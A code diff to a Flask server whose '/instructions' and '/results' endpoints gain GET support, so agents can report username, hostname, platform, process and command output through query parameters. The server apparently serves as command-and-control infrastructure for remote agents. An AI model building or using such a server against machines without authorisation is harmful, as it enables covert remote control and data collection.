@@ -214,22 +214,39 @@ def get_prelude():
     }), 200
 
 
-@app.route('/instructions', methods=['POST'])
+@app.route('/instructions', methods=['GET', 'POST'])
 def post_instructions():
-    """Accept agent profile and return instructions."""
-    if not request.is_json:
-        return jsonify({'error': 'Content-Type must be application/json'}), 400
+    """Accept agent profile and return instructions. Supports both GET and POST."""
 
-    data = request.get_json()
+    # Handle GET request with query parameters
+    if request.method == 'GET':
+        required_fields = ['username', 'hostname', 'platform', 'process']
+        missing = [f for f in required_fields if f not in request.args]
+        if missing:
+            return jsonify({'error': f'Missing required query parameters: {missing}'}), 400
 
-    # Validate profile
-    if 'profile' not in data:
-        return jsonify({'error': 'Missing required field: profile'}), 400
+        profile = {
+            'username': request.args.get('username'),
+            'hostname': request.args.get('hostname'),
+            'platform': request.args.get('platform'),
+            'process': request.args.get('process')
+        }
 
-    profile = data['profile']
-    required_fields = ['username', 'hostname', 'platform', 'process']
-    if not all(field in profile for field in required_fields):
-        return jsonify({'error': f'Profile missing required fields: {required_fields}'}), 400
+    # Handle POST request with JSON body
+    else:
+        if not request.is_json:
+            return jsonify({'error': 'Content-Type must be application/json'}), 400
+
+        data = request.get_json()
+
+        # Validate profile
+        if 'profile' not in data:
+            return jsonify({'error': 'Missing required field: profile'}), 400
+
+        profile = data['profile']
+        required_fields = ['username', 'hostname', 'platform', 'process']
+        if not all(field in profile for field in required_fields):
+            return jsonify({'error': f'Profile missing required fields: {required_fields}'}), 400
 
     # Generate UUID from profile
     agent_uuid = hash_profile(profile)
@@ -258,38 +275,82 @@ def post_instructions():
     }), 200
 
 
-@app.route('/results', methods=['POST'])
+@app.route('/results', methods=['GET', 'POST'])
 def post_results():
-    """Receive results from agent with profile."""
-    if not request.is_json:
-        return jsonify({'error': 'Content-Type must be application/json'}), 400
+    """Receive results from agent with profile. Supports both GET and POST."""
 
-    data = request.get_json()
+    # Handle GET request with query parameters
+    if request.method == 'GET':
+        # Validate profile parameters
+        required_profile_fields = ['username', 'hostname', 'platform', 'process']
+        missing_profile = [f for f in required_profile_fields if f not in request.args]
+        if missing_profile:
+            return jsonify({'error': f'Missing required query parameters: {missing_profile}'}), 400
 
-    # Validate profile
-    if 'profile' not in data:
-        return jsonify({'error': 'Missing required field: profile'}), 400
+        profile = {
+            'username': request.args.get('username'),
+            'hostname': request.args.get('hostname'),
+            'platform': request.args.get('platform'),
+            'process': request.args.get('process')
+        }
 
-    profile = data['profile']
-    required_profile_fields = ['username', 'hostname', 'platform', 'process']
-    if not all(field in profile for field in required_profile_fields):
-        return jsonify({'error': f'Profile missing required fields: {required_profile_fields}'}), 400
+        # Validate required result fields
+        required_fields = ['output', 'timestamp']
+        missing_fields = [f for f in required_fields if f not in request.args]
+        if missing_fields:
+            return jsonify({'error': f'Missing required query parameters: {missing_fields}'}), 400
 
-    # Generate UUID from profile
-    agent_uuid = hash_profile(profile)
+        # Parse metadata if provided (as JSON string)
+        metadata = {}
+        if 'metadata' in request.args:
+            try:
+                import json
+                metadata = json.loads(request.args.get('metadata'))
+            except json.JSONDecodeError:
+                return jsonify({'error': 'metadata must be valid JSON'}), 400
 
-    # Validate required result fields
-    required_fields = ['output', 'timestamp']
-    if not all(field in data for field in required_fields):
-        return jsonify({'error': f'Missing required fields: {required_fields}'}), 400
+        # Store result
+        result = {
+            'output': request.args.get('output'),
+            'timestamp': request.args.get('timestamp'),
+            'status': request.args.get('status', 'unknown'),
+            'metadata': metadata
+        }
 
-    # Store result
-    result = {
-        'output': data.get('output'),
-        'timestamp': data.get('timestamp'),
-        'status': data.get('status', 'unknown'),
-        'metadata': data.get('metadata', {})
-    }
+        # Generate UUID from profile
+        agent_uuid = hash_profile(profile)
+
+    # Handle POST request with JSON body
+    else:
+        if not request.is_json:
+            return jsonify({'error': 'Content-Type must be application/json'}), 400
+
+        data = request.get_json()
+
+        # Validate profile
+        if 'profile' not in data:
+            return jsonify({'error': 'Missing required field: profile'}), 400
+
+        profile = data['profile']
+        required_profile_fields = ['username', 'hostname', 'platform', 'process']
+        if not all(field in profile for field in required_profile_fields):
+            return jsonify({'error': f'Profile missing required fields: {required_profile_fields}'}), 400
+
+        # Generate UUID from profile
+        agent_uuid = hash_profile(profile)
+
+        # Validate required result fields
+        required_fields = ['output', 'timestamp']
+        if not all(field in data for field in required_fields):
+            return jsonify({'error': f'Missing required fields: {required_fields}'}), 400
+
+        # Store result
+        result = {
+            'output': data.get('output'),
+            'timestamp': data.get('timestamp'),
+            'status': data.get('status', 'unknown'),
+            'metadata': data.get('metadata', {})
+        }
 
     if storage.add_result(agent_uuid, result):
         # Clear instructions after receiving results to prevent infinite loops
